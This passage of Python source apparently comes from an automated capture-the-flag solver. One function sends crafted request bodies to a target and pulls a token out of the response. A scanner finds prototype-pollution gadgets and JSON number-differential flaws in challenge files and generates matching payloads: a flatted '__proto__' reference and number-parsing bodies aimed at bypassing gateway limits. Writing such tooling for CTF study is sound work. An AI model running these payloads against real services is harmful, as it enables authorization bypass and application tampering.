    status, text = _send(transport, url, body, hdrs)
    token = _payoff(text, profile, token_pattern)
    unlock_input = extract_unlock_input(text, unlock_input_field) if token is None else None
    steps.append({"status": status, "sent_bytes": len(body), "unlock_input": unlock_input})
    digest = None
    if token is None and unlock_input is not None:
        digest = build_unlock_token(unlock_input, algo=algo)
        body2 = with_body_field(body.decode("utf-8"), unlock_field, digest).encode("utf-8")
        status, text = _send(transport, url, body2, hdrs)
        token = _payoff(text, profile, token_pattern)
        steps.append({"status": status, "sent_bytes": len(body2), "unlock_input": None})
    return {
        "status": status,
        "token": token,
        "response": text[:4096],
        "mechanism": variant.mechanism if isinstance(variant, NumberVariant) else "raw",
        "sent_bytes": len(body),
        "unlock_input": unlock_input,
        "unlock": digest,
        "steps": steps,
    }


# --------------------------------------------------------------------------
# Part 4: the contract engine (offline artifact scan + opt-driven generation)
# --------------------------------------------------------------------------

_JS_SUFFIXES = {".js", ".mjs", ".cjs", ".ts"}
_JSON_SUFFIXES = {".json", ".ndjson", ".txt", ".body", ".har"}
_MAX_FILES = 400
_SKIP_DIR_NAMES = {".ctf", ".git", "__pycache__"}

_FLATTED_PLACEHOLDER = ("<target_field>", "<source_field>", {"<polluted_key>": True})


def _read_text(p: Path) -> str | None:
    """File text, or None when it is over MAX_SOURCE_BYTES (the caller notes it)."""
    if p.stat().st_size > MAX_SOURCE_BYTES:
        return None
    return p.read_bytes().decode("utf-8", "replace")


def _iter_files(root: Path, skipped: dict[str, list[str]]) -> Iterable[Path]:
    """Candidate files under ``root``.  A symlink, or a path that resolves outside
    ``root``, is never read: it is listed in ``skipped["outside_dir"]``."""
    count = 0
    real_root = root.resolve()
    for p in sorted(root.rglob("*")):
        rel_parts = p.relative_to(root).parts
        if any(part in _SKIP_DIR_NAMES or part.startswith(".") for part in rel_parts):
            continue
        if p.suffix.lower() not in (_JS_SUFFIXES | _JSON_SUFFIXES):
            continue
        rel = str(p.relative_to(root))
        if p.is_symlink() or not p.resolve().is_relative_to(real_root):
            skipped["outside_dir"].append(rel)
            continue
        if not p.is_file():
            continue
        count += 1
        if count > _MAX_FILES:
            skipped["file_cap"].append(f"stopped after {_MAX_FILES} files at {rel}")
            break
        yield p


def solve(challenge_dir: Path, profile: Any = None, **opts: Any) -> SolverResult:
    """Scan a challenge's artifacts for PP gadgets and JSON number differentials.

    Offline and plan-only: never sends a request, never a flag.  ``opts`` may add
    direct generation: ``diff_key`` + ``gateway_limit`` + ``unlock_value`` emit
    number-differential bodies for that field; ``flatted_target`` +
    ``flatted_source`` + ``flatted_props`` (a JSON object) fill the flatted
    ``__proto__``-reference payload emitted when a flatted sink is found.
    """
    cdir = Path(challenge_dir)
    if not cdir.exists() or not cdir.is_dir():
        return SolverResult(
            status="blocked",
            engine=ENGINE_ID,
            notes=f"challenge dir not found or not a directory: {challenge_dir}",
        )

    evidence: list[Evidence] = []
    catalog: dict[str, Any] = {"pp_gadgets": {}, "number_differentials": {}, "payloads": {}}
    skipped: dict[str, list[str]] = {"outside_dir": [], "too_large": [], "unreadable": [], "file_cap": []}
    flatted_seen = False

    for f in _iter_files(cdir, skipped):
        rel = str(f.relative_to(cdir))
        try:
            text = _read_text(f)
        except OSError as exc:
            skipped["unreadable"].append(f"{rel}: {exc.strerror or exc}")
            continue
        if text is None:
            skipped["too_large"].append(rel)
            continue
        suffix = f.suffix.lower()
        if suffix in _JS_SUFFIXES:
            gadgets = scan_pp_gadgets(text)
            risky = [g for g in gadgets if g["exploitable_without_guard"]]
            if risky:
                catalog["pp_gadgets"][rel] = risky
                flatted_seen = flatted_seen or any(g["family"] == "flatted_parse" for g in risky)
                for g in risky[:4]:
                    evidence.append(Evidence(
                        kind="match",
                        detail=f"{g['family']} sink, unguarded {', '.join(g['unguarded_keys'])} (line {g['line']})",
                        path=rel,
                    ))
        if suffix in _JSON_SUFFIXES:
            try:
                diffs = detect_number_differentials(text)
            except NumberDiffError:
                diffs = []
            if diffs:
                catalog["number_differentials"][rel] = diffs
                for d in diffs[:4]:
                    if d["kind"] == "duplicate_key":
                        detail = f"duplicate key {d['key']} at {d['path']}: {d['values']}"
                    else:
                        detail = f"{d['kind']} number {d['token']} reads {d['exact']} exact vs {d['float64']} in float64"
                    evidence.append(Evidence(kind="match", detail=detail, path=rel))

    if flatted_seen:
        tgt, src, props = _FLATTED_PLACEHOLDER
        filled = all(k in opts for k in ("flatted_target", "flatted_source", "flatted_props"))
        try:
            if filled:
                tgt, src = str(opts["flatted_target"]), str(opts["flatted_source"])
                props = json.loads(opts["flatted_props"]) if isinstance(opts["flatted_props"], str) \
                    else opts["flatted_props"]
            catalog["payloads"]["flatted_proto"] = {
                "body": flatted_proto_payload(tgt, src, props),
                "filled": filled,
                "note": "the target field's \"__proto__\" reference resolves to Array.prototype; a later "
                        "merge(target, source) writes the source props onto it",
            }
        except (NumberDiffError, ValueError) as exc:
            catalog["payloads"]["flatted_proto_error"] = str(exc)

    # opt-driven direct generation
    if "diff_key" in opts and "gateway_limit" in opts and "unlock_value" in opts:
        try:
            variants = number_differential_variants(
                str(opts["diff_key"]),
                gateway_limit=int(opts["gateway_limit"]),
                unlock_value=int(opts["unlock_value"]),
            )
            catalog["payloads"]["number_differential"] = [
                {"mechanism": v.mechanism, "body": v.body,
                 "gateway_reads": v.gateway_reads, "backend_reads": v.backend_reads,
                 "note": v.note}
                for v in variants
            ]
            evidence.append(Evidence(
                kind="plan",
                detail=f"{len(variants)} number-differential bodies for {opts['diff_key']!r}",
            ))
        except (NumberDiffError, ValueError) as exc:
            catalog["payloads"]["number_differential_error"] = str(exc)

    skipped = {k: v for k, v in skipped.items() if v}
    if skipped:
        catalog["skipped"] = skipped
    fired = bool(catalog["pp_gadgets"]) or bool(catalog["number_differentials"]) or bool(catalog["payloads"])
    if fired:
        return SolverResult(
            status="unsure",
            engine=ENGINE_ID,
            evidence=tuple(evidence),
            cost=Cost(),
            notes=json.dumps(catalog, ensure_ascii=False, sort_keys=True),
        )
    note = ("no PP gadget or JSON number-differential signal in the artifacts; "
            "pass --opt diff_key= --opt gateway_limit= --opt unlock_value= to generate bodies directly")
    if skipped:
        note += "; files not read: " + json.dumps(skipped, ensure_ascii=False, sort_keys=True)
    return SolverResult(status="none", engine=ENGINE_ID, notes=note)
